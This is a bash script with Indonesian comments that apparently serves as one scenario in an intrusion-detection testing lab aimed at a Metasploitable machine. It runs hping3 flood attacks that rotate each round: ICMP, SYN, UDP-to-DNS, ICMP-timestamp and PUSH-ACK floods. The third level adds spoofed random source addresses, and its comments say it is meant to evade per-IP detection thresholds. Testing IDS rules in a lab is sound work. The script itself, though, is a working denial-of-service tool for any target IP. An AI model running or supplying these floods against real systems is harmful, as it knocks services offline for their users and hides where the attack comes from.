#!/bin/bash

# =================================================================
# SKENARIO 03: DENIAL OF SERVICE (DoS) - ROTASI PAYLOAD
# Strategi: 3 Level Depth (Volumetric, Protocol, Randomized)
# Input: Menerima argumen $1 sebagai Nomor Ronde
# =================================================================

# Menerima Input Nomor Ronde dari Daily Round
ROUND=${1:-1} # Default ke ronde 1 jika kosong

# KONFIGURASI
TARGET_IP="192.168.113.50"   # Ganti dengan IP Metasploitable
LOG_FILE="logs/dos_session_$(date +%F).log"

# Warna untuk Tampilan Laporan
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# =================================================================
# LOGIKA ROTASI PAYLOAD (PAYLOAD DIVERSITY)
# Mengubah Protokol & Target Port berdasarkan fase ronde
# =================================================================
if [ "$ROUND" -le 10 ]; then
    # --- SET A (Ronde 1-10) ---
    # Level 1: ICMP Flood (Ping Flood Standard)
    OPT_L1="-1"
    DESC_L1="ICMP Flood (Smurf/Ping)"
    
    # Level 2: SYN Flood ke Port 80 (HTTP)
    OPT_L2="-S -p 80"
    DESC_L2="SYN Flood (Port 80/HTTP)"

elif [ "$ROUND" -le 20 ]; then
    # --- SET B (Ronde 11-20) ---
    # Level 1: UDP Flood ke Port 53 (DNS)
    OPT_L1="-2 -p 53"
    DESC_L1="UDP Flood (Port 53/DNS)"
    
    # Level 2: SYN Flood ke Port 21 (FTP) - Ganti Target Service
    OPT_L2="-S -p 21"
    DESC_L2="SYN Flood (Port 21/FTP)"

else
    # --- SET C (Ronde 21-30) ---
    # Level 1: ICMP Timestamp Flood (Type 13)
    OPT_L1="--icmp-ts"
    DESC_L1="ICMP Timestamp Flood"
    
    # Level 2: PUSH-ACK Flood (TCP State Confusion)
    OPT_L2="-PA -p 80"
    DESC_L2="PUSH-ACK Flood (Port 80)"
fi

echo "[+] [03_DOS] Memulai Skenario Denial of Service..."
echo "[+] Target: $TARGET_IP"
echo "[+] Mode: Ronde $ROUND ($DESC_L1 & $DESC_L2)"
echo "[+] Waktu Mulai: $(date)"

# -----------------------------------------------------------------
# LEVEL 1: VOLUMETRIC FLOOD (BANDWIDTH)
# Tujuan: Menguji deteksi Volumetric Attack pada protokol berbeda.
# Teknik: Mengirim paket secepat mungkin (--flood).
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 1] Running $DESC_L1 (30 Detik)...${NC}"

# Merekam timestamp awal
echo "Start Flood: $(date)" > logs/dos_lvl1_r${ROUND}.txt

# Simpan Command (Menggunakan variabel $OPT_L1)
CMD="timeout 30 hping3 $OPT_L1 --flood $TARGET_IP"

# Tampilkan Command ke Layar
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Eksekusi Command
$CMD >> logs/dos_lvl1_r${ROUND}.txt 2>&1
echo "    -> Selesai. (Harapan: Alert GPL Large Packet / Stream anomaly)"
sleep 10

# -----------------------------------------------------------------
# LEVEL 2: PROTOCOL FLOOD (TCP STATE EXHAUSTION)
# Tujuan: Menghabiskan resource CPU/RAM target (Service Stress).
# Teknik: Menggunakan flag dan port spesifik variabel $OPT_L2.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 2] Running $DESC_L2 (30 Detik)...${NC}"

echo "Start Protocol Flood: $(date)" > logs/dos_lvl2_r${ROUND}.txt

# Simpan Command (Menggunakan variabel $OPT_L2)
CMD="timeout 30 hping3 $OPT_L2 --flood $TARGET_IP"

# Tampilkan Command ke Layar
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Eksekusi Command
$CMD >> logs/dos_lvl2_r${ROUND}.txt 2>&1
echo "    -> Selesai. (Harapan: Alert ET DOS Potential Flood)"
sleep 10

# -----------------------------------------------------------------
# LEVEL 3: RANDOM SOURCE ATTACK (DDoS SIMULATION)
# Tujuan: Mengelabui Rule "Threshold per IP".
# Teknik: Menggunakan IP Palsu Acak (--rand-source) dengan vektor L2.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 3] Running Random Source DDoS (--rand-source)...${NC}"

echo "Start DDoS Sim: $(date)" > logs/dos_lvl3_r${ROUND}.txt

# Simpan Command (Gabungan vektor L2 + Random Source)
CMD="timeout 30 hping3 $OPT_L2 --flood --rand-source $TARGET_IP"

# Tampilkan Command ke Layar
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Eksekusi Command
$CMD >> logs/dos_lvl3_r${ROUND}.txt 2>&1
echo "    -> Selesai. (Harapan: Menguji Global Threshold IDS)"

echo "[+] [03_DOS] Modul Selesai pada $(date)"
echo "-----------------------------------------------------------"